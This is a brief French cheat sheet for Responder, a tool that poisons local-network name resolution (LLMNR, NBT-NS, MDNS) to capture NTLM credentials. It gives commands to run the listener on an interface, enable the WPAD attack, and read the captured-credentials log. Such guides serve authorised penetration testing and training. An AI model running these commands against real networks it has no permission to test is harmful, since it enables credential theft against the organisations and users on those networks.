# Responder

## 📌 Présentation
Responder est un outil permettant d'exploiter les protocoles de résolution de noms sur un réseau local (LLMNR, NBT-NS, MDNS) pour capturer des identifiants NTLMv1/v2.

## 🛠️ Installation
Sur Kali Linux, Responder est préinstallé. Pour vérifier :
```bash
responder -h
```
Si ce n'est pas le cas :
```bash
sudo apt update && sudo apt install responder -y
```

## 🚀 Utilisation de base

### 📡 1. Écouter le réseau sur une interface
```bash
sudo responder -I <interface>
```
Exemple :
```bash
sudo responder -I eth0
```

### 🔥 2. Activer l'attaque avec WPAD
```bash
sudo responder -I eth0 -w On
```

### 📜 3. Vérifier les logs des identifiants capturés
```bash
cat /usr/share/responder/logs/Responder-Session.log
```
